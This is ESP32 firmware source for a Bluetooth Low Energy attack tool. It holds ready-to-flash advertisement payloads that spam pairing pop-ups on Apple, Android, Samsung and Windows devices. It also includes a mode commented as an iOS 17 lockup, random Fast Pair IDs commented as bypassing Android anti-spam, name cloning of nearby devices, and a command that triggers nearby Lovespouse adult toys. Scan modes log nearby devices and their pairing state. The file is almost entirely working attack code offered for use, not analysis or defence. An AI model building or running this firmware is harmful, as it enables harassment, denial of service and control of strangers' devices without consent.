/*
 * RadioRecon ESP32 Firmware v4.1
 * FIXED: Reverted to v3.0 array format that confirmed working on Samsung A10
 *
 * Works on: ESP32-S3 (USB CDC Off for FTDI), ESP32-C3 (USB CDC On)
 * REQUIRES: NimBLE-Arduino library
 */

#include <NimBLEDevice.h>

#define FW_VER "BLEAK-ESP32 v4.1"

#if CONFIG_IDF_TARGET_ESP32S3
  #define CHIP_NAME "ESP32-S3"
#elif CONFIG_IDF_TARGET_ESP32C3
  #define CHIP_NAME "ESP32-C3"
#else
  #define CHIP_NAME "ESP32"
#endif

// ═══ PAYLOADS — FIXED ARRAYS (v3.0 format that WORKS) ═══

// Apple Continuity
static const uint8_t APPLE[][31] = {
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,
   0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,
   0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,
   0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,
   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,
   0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};
#define APPLE_N 5

// Google Fast Pair — known Model IDs + RANDOM generation
// Android anti-spam silences known IDs after repeated exposure
// Solution: generate random Model IDs (like Flipper Zero Xtreme)
static const uint8_t GFASTPAIR[][11] = {
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x10,0xC4,0x52},  // Sony WH-1000XM5
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x8B,0x66,0xAB},  // Pixel Buds Pro
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x2D,0x7A,0x23},  // Pixel Buds A
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0xF5,0x24,0x94},  // Bose QC Ultra
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0xCD,0x82,0x56},  // JBL Flip 6
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0xD0,0xF7,0x00},  // Nothing Ear 1
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x0E,0xB4,0x00},  // JBL Tune 760NC
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0xAA,0xC5,0x00},  // Galaxy Buds2
};
#define GFASTPAIR_N 8

// ═══ FORWARD DECLARATIONS ═══════════════════════════════

void tx(const uint8_t* d, uint8_t len);
void txRandomFastPair();
void txWithName(const uint8_t* d, uint8_t len, const char* name);
void doSpamCycle();



// Microsoft Swift Pair
static const uint8_t MSFT[][7] = {
  {0x06,0xff,0x06,0x00,0x03,0x00,0x80},
  {0x06,0xff,0x06,0x00,0x03,0x00,0xc0},
  {0x06,0xff,0x06,0x00,0x03,0x00,0xa0},
};
#define MSFT_N 3

static const char* MSFT_NAMES[] = {"BT Speaker", "Controller", "Headphones"};

// Lovespouse (Adult Toy Control)
static const uint8_t LOVE_ON[] = {0x09,0xff,0x00,0x05,0x8f,0x53,0x00,0x00,0x64,0x01};
static const uint8_t LOVE_OFF[] = {0x09,0xff,0x00,0x05,0x8f,0x53,0x00,0x00,0x00,0x01};

// Apple Action Modal (type 0x0F — share phone number etc)
static const uint8_t APPLE_ACT[][19] = {
  {0x10,0xff,0x4c,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00},
  {0x10,0xff,0x4c,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00},
  {0x10,0xff,0x4c,0x00,0x0f,0x05,0xc1,0x07,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00},
  {0x10,0xff,0x4c,0x00,0x0f,0x05,0xc1,0x0e,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00,0x00,0x00},
};
#define APPLE_ACT_N 4

// Samsung-specific Fast Pair IDs
static const uint8_t SBUDS[][11] = {
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0xA5,0x9E,0xFC},
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0xAA,0xC5,0x00},
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x72,0xEF,0x22},
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x28,0x8B,0x2F},
};
#define SBUDS_N 4

static const uint8_t SWATCH[][11] = {
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x58,0xCF,0x07},
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x58,0xCF,0x59},
  {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x58,0xCF,0x73},
};
#define SWATCH_N 3

// ═══ STATE ══════════════════════════════════════════════

NimBLEAdvertising* pAdv = nullptr;
volatile bool spamActive = false;
volatile uint32_t pkts = 0;
volatile unsigned long spamEnd = 0;
String sType = "";
volatile uint16_t idx = 0;

volatile bool karmaActive = false;
volatile int karmaCount = 0;
unsigned long karmaEndMs = 0;

// ═══ KARMA CALLBACK ═════════════════════════════════════

class KarmaScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    if (!karmaActive) return;
    if (d->getRSSI() < -75) return;
    String name = d->haveName() ? String(d->getName().c_str()) : "";
    String addr = String(d->getAddress().toString().c_str());
    Serial.println("KARMA:SEEN:" + addr + ":" + String(d->getRSSI()) + ":" + name);
    if (name.length() > 0) {
      uint8_t buf[33];
      uint8_t nlen = min((int)name.length(), 29);
      buf[0] = nlen + 1; buf[1] = 0x09;
      memcpy(&buf[2], name.c_str(), nlen);
      uint8_t a[6]; esp_fill_random(a, 6); a[0] |= 0xC0;
      ble_hs_id_set_rnd(a);
      NimBLEAdvertisementData ad;
      ad.addData(buf, nlen + 2);
      pAdv->stop();
      pAdv->setAdvertisementData(ad);
      pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
      pAdv->start(); delay(40); pAdv->stop();
      karmaCount++;
      Serial.println("KARMA:CLONE:" + addr + ":" + name);
    }
  }
};

// ═══ SCAN CALLBACK ══════════════════════════════════════

class ScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    Serial.println("DEV:" + String(d->getAddress().toString().c_str()) +
                   ":" + String(d->getRSSI()) +
                   ":" + String(d->haveName() ? d->getName().c_str() : "?"));
  }
};

// Fast Pair scan — emits FP:<mac>:<rssi>:<model_id>:<pairing_state>:<name>
class FastPairScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    bool isFP = false;
    char modelId[7] = "??????";
    const char* pairingState = "unknown";

    // Check Service UUID 0xFE2C
    if (d->haveServiceUUID()) {
      for (int i = 0; i < (int)d->getServiceUUIDCount(); i++) {
        if (d->getServiceUUID(i).equals(NimBLEUUID((uint16_t)0xFE2C))) {
          isFP = true;
        }
      }
    }

    // Check Service Data for 0xFE2C
    if (d->haveServiceData()) {
      if (d->getServiceDataUUID().equals(NimBLEUUID((uint16_t)0xFE2C))) {
        isFP = true;
        std::string sd = d->getServiceData();
        if (sd.length() >= 3) {
          snprintf(modelId, sizeof(modelId), "%02X%02X%02X",
                   (uint8_t)sd[0], (uint8_t)sd[1], (uint8_t)sd[2]);
          // Bit 6 of byte 0: 1 = discoverable (not paired), 0 = paired/silent
          pairingState = ((uint8_t)sd[0] & 0x40) ? "discoverable" : "paired_nearby";
        }
      }
    }

    // Check Manufacturer Data for Google (0x00E0)
    if (d->haveManufacturerData()) {
      std::string md = d->getManufacturerData();
      if (md.length() >= 2) {
        uint16_t company = ((uint8_t)md[1] << 8) | (uint8_t)md[0];
        if (company == 0x00E0) {
          isFP = true;
          if (md.length() >= 5) {
            snprintf(modelId, sizeof(modelId), "%02X%02X%02X",
                     (uint8_t)md[2], (uint8_t)md[3], (uint8_t)md[4]);
            pairingState = ((uint8_t)md[2] & 0x40) ? "discoverable" : "paired_nearby";
          }
        }
      }
    }

    if (isFP) {
      Serial.println("FP:" + String(d->getAddress().toString().c_str()) +
                     ":" + String(d->getRSSI()) +
                     ":" + String(modelId) +
                     ":" + String(pairingState) +
                     ":" + String(d->haveName() ? d->getName().c_str() : "FastPairDevice"));
    }
  }
};

// Raw scan — emits all advertisements as RAW:<mac>:<rssi>:<hex_payload>
class RawScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    // Rebuild a minimal AD payload from available data for host-side parsing
    String hexPayload = "";

    if (d->haveServiceData()) {
      std::string sd = d->getServiceData();
      NimBLEUUID uuid = d->getServiceDataUUID();
      // getNative() removed in newer NimBLE — parse UUID string instead
      uint16_t u16 = 0;
      if (uuid.bitSize() == 16) {
        std::string us = uuid.toString(); // e.g. "0000fe2c-0000-1000-8000-00805f9b34fb"
        if (us.length() >= 8)
          u16 = (uint16_t)strtoul(us.substr(4, 4).c_str(), NULL, 16);
      }
      uint8_t adLen = (uint8_t)(sd.length() + 3);
      char buf[8]; snprintf(buf, sizeof(buf), "%02X%02X%02X%02X", adLen, 0x16, u16 & 0xFF, (u16 >> 8) & 0xFF);
      hexPayload += String(buf);
      for (size_t i = 0; i < sd.length(); i++) {
        char b[3]; snprintf(b, sizeof(b), "%02X", (uint8_t)sd[i]);
        hexPayload += String(b);
      }
    }

    if (d->haveManufacturerData()) {
      std::string md = d->getManufacturerData();
      uint8_t adLen = (uint8_t)(md.length() + 1);
      char buf[6]; snprintf(buf, sizeof(buf), "%02X%02X", adLen, 0xFF);
      hexPayload += String(buf);
      for (size_t i = 0; i < md.length(); i++) {
        char b[3]; snprintf(b, sizeof(b), "%02X", (uint8_t)md[i]);
        hexPayload += String(b);
      }
    }

    if (hexPayload.length() > 0) {
      Serial.println("RAW:" + String(d->getAddress().toString().c_str()) +
                     ":" + String(d->getRSSI()) +
                     ":0:" + hexPayload);
    }
  }
};

// ═══ SPAM TASK (dual-core only) ═════════════════════════

#if CONFIG_IDF_TARGET_ESP32S3 || CONFIG_IDF_TARGET_ESP32
TaskHandle_t spamTask = NULL;
void spamTaskFunc(void* param) {
  while (true) {
    if (spamActive && millis() < spamEnd) doSpamCycle();
    else if (spamActive && millis() >= spamEnd) {
      spamActive = false; pAdv->stop();
      Serial.println("SPAM:DONE:" + String(pkts));
    }
    vTaskDelay(1);
  }
}
#endif

// ═══ SETUP ══════════════════════════════════════════════

void setup() {
  Serial.begin(115200);
  delay(500);
  NimBLEDevice::init("");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  pAdv = NimBLEDevice::getAdvertising();

  #if CONFIG_IDF_TARGET_ESP32S3 || CONFIG_IDF_TARGET_ESP32
    xTaskCreatePinnedToCore(spamTaskFunc, "spam", 4096, NULL, 2, &spamTask, 0);
  #endif

  Serial.println("OK:" FW_VER " [" CHIP_NAME "]");
}

// ═══ MAIN LOOP ══════════════════════════════════════════

void loop() {
  if (Serial.available()) {
    String c = Serial.readStringUntil('\n');
    c.trim();
    if (c.length()) handleCmd(c);
  }

  #if CONFIG_IDF_TARGET_ESP32C3
  if (spamActive) {
    if (millis() < spamEnd) doSpamCycle();
    else { spamActive = false; pAdv->stop(); Serial.println("SPAM:DONE:" + String(pkts)); }
  }
  #endif

  if (karmaActive && millis() > karmaEndMs) {
    karmaActive = false;
    NimBLEDevice::getScan()->stop();
    Serial.println("KARMA:DONE:" + String(karmaCount));
  }
  delay(1);
}

// ═══ COMMAND HANDLER ════════════════════════════════════

void handleCmd(String c) {
  String u = c; u.toUpperCase();

  if (u == "AT+VERSION") {
    Serial.println("OK:" FW_VER " [" CHIP_NAME "]");
  }
  else if (u == "AT+STATUS") {
    String st = spamActive ? "spam:" + sType : (karmaActive ? "karma" : "idle");
    Serial.println("OK:" + st + ",pkts=" + String(pkts) +
                   ",karma=" + String(karmaCount) +
                   ",heap=" + String(ESP.getFreeHeap()) +
                   ",chip=" CHIP_NAME);
  }
  else if (u == "AT+HELP") {
    Serial.println("OK:CMDS:VERSION,STATUS,SPAM=type.dur,STOP,KARMA=dur,KARMASTOP,SCAN=sec,FPSCAN=sec,SCANRAW=sec,ADV=hex,BEACON=name.dur");
  }
  else if (u.startsWith("AT+SPAM=")) {
    String p = c.substring(8);
    int cm = p.indexOf(',');
    sType = p.substring(0, cm > 0 ? cm : p.length());
    sType.toLowerCase();
    int dur = cm > 0 ? p.substring(cm + 1).toInt() : 30;
    dur = constrain(dur, 1, 300);
    pkts = 0; idx = 0;
    spamEnd = millis() + dur * 1000UL;
    spamActive = true;
    Serial.println("OK:SPAM:" + sType + ":" + String(dur));
  }
  else if (u == "AT+STOP") {
    spamActive = false; karmaActive = false;
    pAdv->stop();
    NimBLEDevice::getScan()->stop();
    Serial.println("OK:STOP:pkts=" + String(pkts) + ",karma=" + String(karmaCount));
  }
  else if (u.startsWith("AT+KARMA=")) {
    int dur = c.substring(9).toInt();
    dur = constrain(dur > 0 ? dur : 30, 5, 300);
    karmaActive = true; karmaCount = 0;
    karmaEndMs = millis() + dur * 1000UL;
    auto* sc = NimBLEDevice::getScan();
    sc->setScanCallbacks(new KarmaScanCB(), false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    sc->start(dur, false);
    Serial.println("OK:KARMA:" + String(dur));
  }
  else if (u == "AT+KARMASTOP") {
    karmaActive = false;
    NimBLEDevice::getScan()->stop();
    Serial.println("OK:KARMASTOP:" + String(karmaCount));
  }
  else if (u.startsWith("AT+SCAN=")) {
    int s = c.substring(8).toInt();
    if (s < 1) s = 5;
    Serial.println("OK:SCAN:" + String(s));
    auto* sc = NimBLEDevice::getScan();
    sc->setScanCallbacks(new ScanCB(), false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    sc->start(s, false);
    Serial.println("OK:SCANDONE");
  }
  else if (u.startsWith("AT+FPSCAN=")) {
    // Fast Pair dedicated scan — filters for UUID 0xFE2C and Google manufacturer (0x00E0)
    int s = c.substring(10).toInt();
    if (s < 1) s = 8;
    Serial.println("OK:FPSCAN:" + String(s));
    auto* sc = NimBLEDevice::getScan();
    sc->setScanCallbacks(new FastPairScanCB(), false);
    sc->setActiveScan(true); sc->setInterval(80); sc->setWindow(79);
    sc->start(s, false);
    Serial.println("OK:FPSCANDONE");
  }
  else if (u.startsWith("AT+SCANRAW=")) {
    // Raw scan — emits all advertisements as RAW:<mac>:<rssi>:<hex_payload>
    int s = c.substring(11).toInt();
    if (s < 1) s = 5;
    Serial.println("OK:SCANRAW:" + String(s));
    auto* sc = NimBLEDevice::getScan();
    sc->setScanCallbacks(new RawScanCB(), false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    sc->start(s, false);
    Serial.println("OK:SCANRAWDONE");
  }
  else if (u.startsWith("AT+ADV=")) {
    String h = c.substring(7);
    uint8_t b[31]; int n = 0;
    for (unsigned int i = 0; i < h.length() && n < 31; i += 2)
      b[n++] = (uint8_t)strtol(h.substring(i, i + 2).c_str(), NULL, 16);
    tx(b, n);
    Serial.println("OK:ADV:" + String(n));
  }
  else if (u.startsWith("AT+BEACON=")) {
    String p = c.substring(10);
    int cm = p.indexOf(',');
    String bname = p.substring(0, cm > 0 ? cm : p.length());
    int dur = cm > 0 ? p.substring(cm + 1).toInt() : 30;
    uint8_t buf[33]; uint8_t nlen = min((int)bname.length(), 29);
    buf[0] = nlen + 1; buf[1] = 0x09;
    memcpy(&buf[2], bname.c_str(), nlen);
    NimBLEAdvertisementData ad;
    ad.addData(buf, nlen + 2);
    pAdv->stop();
    pAdv->setAdvertisementData(ad);
    pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    pAdv->start();
    Serial.println("OK:BEACON:" + bname + ":" + String(dur));
  }
  else {
    Serial.println("ERR:" + c);
  }
}

// ═══ TX FUNCTIONS ═══════════════════════════════════════

void tx(const uint8_t* d, uint8_t len) {
  uint8_t a[6]; esp_fill_random(a, 6); a[0] |= 0xC0;
  ble_hs_id_set_rnd(a);
  NimBLEAdvertisementData ad;
  ad.addData(d, len);
  pAdv->stop();
  pAdv->setAdvertisementData(ad);
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x20);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
  pAdv->start();
  delay(20 + random(20));
  pAdv->stop();
  pkts++;
}

// Generate random Fast Pair payload (bypasses anti-spam)
void txRandomFastPair() {
  uint8_t payload[11] = {0x03,0x03,0x2c,0xfe, 0x06,0x16,0x2c,0xfe, 0x00,0x00,0x00};
  payload[8] = random(256);
  payload[9] = random(256);
  payload[10] = random(256);
  tx(payload, 11);
}

void txWithName(const uint8_t* d, uint8_t len, const char* name) {
  uint8_t a[6]; esp_fill_random(a, 6); a[0] |= 0xC0;
  ble_hs_id_set_rnd(a);
  NimBLEAdvertisementData ad;
  ad.addData(d, len);
  NimBLEAdvertisementData sr;
  uint8_t nb[33]; uint8_t nl = strlen(name); if (nl > 29) nl = 29;
  nb[0] = nl + 1; nb[1] = 0x09; memcpy(&nb[2], name, nl);
  sr.addData(nb, nl + 2);
  pAdv->stop();
  pAdv->setAdvertisementData(ad);
  pAdv->setScanResponseData(sr);
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x20);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_UND);
  pAdv->start();
  delay(30 + random(30));
  pAdv->stop();
  pkts++;
}

// ═══ SPAM CYCLE ═════════════════════════════════════════

void doSpamCycle() {
  // Apple attacks
  if (sType == "apple" || sType == "all" || sType == "kitchen") {
    tx(APPLE[idx % APPLE_N], 31);
    if (sType != "all" && sType != "kitchen") { idx++; return; }
  }
  if (sType == "apple_crash" || sType == "sourapple") {
    // iOS 17 lockup — rapid-fire random Apple proximity pairing
    uint8_t crash[31];
    memcpy(crash, APPLE[0], 31);
    crash[7] = random(256); crash[8] = random(256); // Random model
    tx(crash, 31);
    idx++; return;
  }
  if (sType == "apple_action") {
    tx(APPLE_ACT[idx % APPLE_ACT_N], 19);
    idx++; return;
  }
  if (sType == "apple_popup") {
    tx(APPLE[idx % APPLE_N], 31);
    idx++; return;
  }
  // Android attacks
  if (sType == "android" || sType == "all" || sType == "kitchen") {
    tx(GFASTPAIR[idx % GFASTPAIR_N], 11);
    if (sType != "all" && sType != "kitchen") { idx++; return; }
  }
  // Samsung-specific
  if (sType == "samsung" || sType == "samsung_buds" || sType == "all" || sType == "kitchen") {
    tx(SBUDS[idx % SBUDS_N], 11);
    if (sType == "samsung_buds") { idx++; return; }
    if (sType != "all" && sType != "kitchen") { idx++; return; }
  }
  if (sType == "samsung_watch") {
    tx(SWATCH[idx % SWATCH_N], 11);
    idx++; return;
  }
  // Windows
  if (sType == "windows" || sType == "all" || sType == "kitchen") {
    txWithName(MSFT[idx % MSFT_N], 7, MSFT_NAMES[idx % MSFT_N]);
    if (sType != "all" && sType != "kitchen") { idx++; return; }
  }
  // Lovespouse
  if (sType == "lovespouse" || sType == "love") {
    tx(LOVE_ON, 10);
    idx++; return;
  }
  if (sType == "lovespouse_stop" || sType == "love_stop") {
    tx(LOVE_OFF, 10);
    idx++; return;
  }
  idx++;
}
